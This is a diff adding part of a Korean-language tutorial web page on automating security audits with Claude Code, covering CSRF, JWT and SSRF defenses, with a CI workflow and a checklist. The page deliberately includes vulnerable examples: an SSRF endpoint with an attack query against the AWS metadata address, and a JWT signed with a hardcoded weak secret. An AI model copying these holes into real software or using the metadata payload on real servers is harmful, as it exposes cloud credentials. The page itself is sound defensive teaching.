+      - name: 보안 보고서 업로드
+        uses: github/codeql-action/upload-sarif@v3
+        if: always()
+        with:
+          sarif_file: security-report.sarif
+
+      - name: PR에 보안 리뷰 코멘트
+        if: github.event_name == 'pull_request'
+        run: |
+          claude /security --changed-since ${{ github.event.pull_request.base.sha }} \
+            --format markdown >> security-comment.md
+          gh pr comment ${{ github.event.pull_request.number }} \
+            --body-file security-comment.md
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}</code></pre>
+
+  <h2>CSRF(Cross-Site Request Forgery) 방어</h2>
+
+  <p>CSRF 공격은 인증된 사용자의 권한을 이용하여 사용자가 의도하지 않은 요청을 서버에 보내는 공격입니다.</p>
+
+  <pre><code>// Express.js CSRF 방어 미들웨어
+const csrf = require('csurf');
+const cookieParser = require('cookie-parser');
+
+app.use(cookieParser());
+
+const csrfProtection = csrf({
+  cookie: {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'strict'
+  }
+});
+
+// 상태 변경 엔드포인트에 CSRF 보호 적용
+app.post('/api/transfer', csrfProtection, async (req, res) => {
+  // CSRF 토큰이 유효한 경우에만 실행됨
+  const { toAccount, amount } = req.body;
+  await transferFunds(req.user.id, toAccount, amount);
+  res.json({ success: true });
+});
+
+// 클라이언트에 CSRF 토큰 제공
+app.get('/api/csrf-token', csrfProtection, (req, res) => {
+  res.json({ csrfToken: req.csrfToken() });
+});</code></pre>
+
+  <pre><code>// 프론트엔드에서 CSRF 토큰 사용
+async function makeSecureRequest(url, data) {
+  // CSRF 토큰 가져오기
+  const tokenResponse = await fetch('/api/csrf-token', {
+    credentials: 'include'
+  });
+  const { csrfToken } = await tokenResponse.json();
+
+  // 요청에 CSRF 토큰 포함
+  return fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'CSRF-Token': csrfToken
+    },
+    credentials: 'include',
+    body: JSON.stringify(data)
+  });
+}</code></pre>
+
+  <h2>인증 결함 방어: JWT 보안 강화</h2>
+
+  <pre><code>// 취약한 JWT 설정
+const jwt = require('jsonwebtoken');
+
+// 문제점들:
+// 1. 약한 비밀키
+// 2. 만료시간 미설정
+// 3. algorithm 미지정 (none 공격 가능)
+const token = jwt.sign({ userId: user.id }, 'weak-secret');
+
+// 안전한 JWT 설정
+const jwt = require('jsonwebtoken');
+
+function generateTokens(user) {
+  const accessToken = jwt.sign(
+    {
+      sub: user.id,
+      role: user.role,
+      type: 'access'
+    },
+    process.env.JWT_SECRET,  // 최소 256비트 비밀키
+    {
+      algorithm: 'HS256',     // 알고리즘 명시
+      expiresIn: '15m',       // 짧은 만료시간
+      issuer: 'myapp.com',    // 발급자 명시
+      audience: 'myapp.com',  // 대상 명시
+    }
+  );
+
+  const refreshToken = jwt.sign(
+    { sub: user.id, type: 'refresh' },
+    process.env.JWT_REFRESH_SECRET,
+    {
+      algorithm: 'HS256',
+      expiresIn: '7d',
+      issuer: 'myapp.com',
+    }
+  );
+
+  return { accessToken, refreshToken };
+}
+
+// 토큰 검증 시 모든 클레임 확인
+function verifyAccessToken(token) {
+  return jwt.verify(token, process.env.JWT_SECRET, {
+    algorithms: ['HS256'],     // 허용 알고리즘 제한
+    issuer: 'myapp.com',
+    audience: 'myapp.com',
+    clockTolerance: 30,        // 30초 시간 오차 허용
+  });
+}</code></pre>
+
+  <h2>SSRF(Server-Side Request Forgery) 방어</h2>
+
+  <p>SSRF 공격은 서버가 공격자가 지정한 URL로 요청을 보내도록 유도하여 내부 네트워크의 리소스에 접근하는 공격입니다.</p>
+
+  <pre><code>// 취약한 코드 - SSRF
+app.get('/api/fetch-url', async (req, res) => {
+  const { url } = req.query;
+  // 사용자 입력 URL로 직접 요청 (위험!)
+  const response = await fetch(url);
+  const data = await response.text();
+  res.send(data);
+  // 공격: ?url=http://169.254.169.254/latest/meta-data/
+  // 결과: AWS 메타데이터 서버에 접근하여 자격 증명 유출
+});
+
+// 안전한 코드 - URL 화이트리스트 + 내부 IP 차단
+const { URL } = require('url');
+const dns = require('dns').promises;
+const ipaddr = require('ipaddr.js');
+
+async function isInternalIP(hostname) {
+  const addresses = await dns.resolve(hostname);
+  return addresses.some(addr => {
+    const parsed = ipaddr.parse(addr);
+    return parsed.range() !== 'unicast'
+      || addr.startsWith('10.')
+      || addr.startsWith('172.16.')
+      || addr.startsWith('192.168.')
+      || addr.startsWith('169.254.')
+      || addr === '127.0.0.1'
+      || addr === '::1';
+  });
+}
+
+const ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com'];
+
+app.get('/api/fetch-url', async (req, res) => {
+  const { url } = req.query;
+
+  try {
+    const parsed = new URL(url);
+
+    // 프로토콜 제한
+    if (!['http:', 'https:'].includes(parsed.protocol)) {
+      return res.status(400).json({ error: '허용되지 않는 프로토콜' });
+    }
+
+    // 도메인 화이트리스트 확인
+    if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
+      return res.status(400).json({ error: '허용되지 않는 도메인' });
+    }
+
+    // 내부 IP 접근 차단
+    if (await isInternalIP(parsed.hostname)) {
+      return res.status(400).json({ error: '내부 네트워크 접근 불가' });
+    }
+
+    const response = await fetch(url, { redirect: 'error' });
+    const data = await response.text();
+    res.send(data);
+  } catch (error) {
+    res.status(400).json({ error: '잘못된 URL입니다' });
+  }
+});</code></pre>
+
+  <h2>보안 체크리스트</h2>
+
+  <p>프로젝트의 보안 상태를 정기적으로 점검하기 위한 체크리스트입니다. Claude Code에 이 체크리스트를 전달하면 각 항목에 대해 자동으로 검사를 수행합니다.</p>
+
+  <table class="compare-table">
+    <thead>
+      <tr>
+        <th>카테고리</th>
+        <th>검사 항목</th>
+        <th>자동화 가능</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>입력 검증</td>
+        <td>모든 사용자 입력에 검증/살균 적용</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>입력 검증</td>
+        <td>파라미터화된 쿼리 사용 (SQL 인젝션 방지)</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>인증</td>
+        <td>bcrypt/argon2로 비밀번호 해시</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>인증</td>
+        <td>JWT 만료시간 및 알고리즘 설정</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>인가</td>
+        <td>모든 API 엔드포인트에 권한 검사</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>인가</td>
+        <td>IDOR 취약점 없음 (리소스 소유자 검증)</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>XSS</td>
+        <td>사용자 입력의 HTML 이스케이프 처리</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>XSS</td>
+        <td>CSP(Content Security Policy) 헤더 설정</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>CSRF</td>
+        <td>상태 변경 요청에 CSRF 토큰 적용</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>암호화</td>
+        <td>HTTPS 전용 통신</td>
+        <td>부분 가능</td>
+      </tr>
+      <tr>
+        <td>암호화</td>
+        <td>민감한 데이터 AES-256 암호화</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>설정</td>
+        <td>프로덕션에서 디버그 모드 비활성화</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>설정</td>
+        <td>보안 헤더 설정 (X-Frame-Options 등)</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>비밀키</td>
+        <td>하드코딩된 비밀키 없음</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>비밀키</td>
+        <td>.env 파일 .gitignore에 등록</td>
+        <td>가능</td>
+      </tr>
+      <tr>
+        <td>로깅</td>
+        <td>보안 이벤트 감사 로그 기록</td>
+        <td>부분 가능</td>
+      </tr>
+      <tr>
+        <td>의존성</td>
+        <td>알려진 취약점이 있는 패키지 없음</td>
+        <td>가능</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="tip-box">
+    <p>이 체크리스트를 Claude Code에 전달하여 자동 점검을 실행하세요: "위 보안 체크리스트의 각 항목을 현재 프로젝트 코드에서 점검하고, 위반 사항이 있으면 수정 코드와 함께 보고해줘."</p>
+  </div>
+
+  <h2>보안 감사 자동화 워크플로우 요약</h2>
+
+  <p>지금까지 다룬 내용을 종합하면, Claude Code를 활용한 보안 감사 자동화는 다음과 같은 단계로 구성됩니다.</p>
+
+  <ol>
+    <li><strong>개발 단계</strong>: 코드 작성 시 Claude Code에게 보안 리뷰를 요청합니다. <code>/security 파일명</code> 명령으로 즉시 피드백을 받을 수 있습니다.</li>
+    <li><strong>커밋 단계</strong>: pre-commit 훅으로 하드코딩된 비밀키, .env 파일 등을 자동 검사합니다.</li>
+    <li><strong>PR 단계</strong>: CI/CD 파이프라인에서 SAST 분석, 의존성 취약점 스캔, 비밀키 유출 스캔을 자동으로 실행합니다.</li>
+    <li><strong>정기 감사</strong>: 보안 감사 에이전트를 주기적으로 실행하여 전체 코드베이스의 보안 상태를 점검합니다.</li>
+  </ol>
+
+  <blockquote>
+    <p>보안은 한 번에 완성되는 것이 아니라 지속적인 과정입니다. Claude Code를 활용하면 이 과정을 자동화하고 일관성을 유지할 수 있지만, 최종적인 보안 판단은 항상 보안 전문가의 검토를 포함해야 합니다.</p>
+  </blockquote>
+
+  <h2>관련 리소스</h2>
+  <div class="related-links">
+    <div class="related-link"><span>🤖</span><a href="../agents.html">에이전트 가이드</a></div>
+    <div class="related-link"><span>🔗</span><a href="hooks-guide.html">훅 가이드</a></div>
+    <div class="related-link"><span>⚙</span><a href="automation-guide.html">자동화 가이드</a></div>
+  </div>
+
+</article>
+
+<div id="ad-before-footer" class="ad-slot ad-slot--before-footer" aria-label="광고"></div>
+
+<footer class="footer" role="contentinfo">
+  <div class="container">
+    <div class="footer__bottom" style="border-top:var(--border-glass);padding-top:2rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem;">
+      <a href="../index.html" class="gradient-text" style="font-weight:700;">Claude Korea</a>
+      <a href="../blog.html" style="color:var(--text-muted);font-size:var(--text-xs);">← 블로그 목록으로</a>
+      <span style="color:var(--text-muted);font-size:var(--text-xs);">© 2026 Claude Korea</span>
+    </div>
+  </div>
+</footer>
+
+<div id="ad-sticky-bottom" class="ad-slot ad-slot--sticky" aria-label="광고"></div>
+<output id="toast" class="toast" aria-live="polite"></output>
+<script src="../assets/js/tracker.js?v=2"></script>
+<script src="../assets/js/data.js"></script>
+<script src="../assets/js/ads.js"></script>
+<script src="../assets/js/app.js"></script>
+<script>document.addEventListener('DOMContentLoaded', function(){ try{initNav();}catch(e){} renderAds(); CCTracker.recordSession(); });</script>
+</body>
+</html>
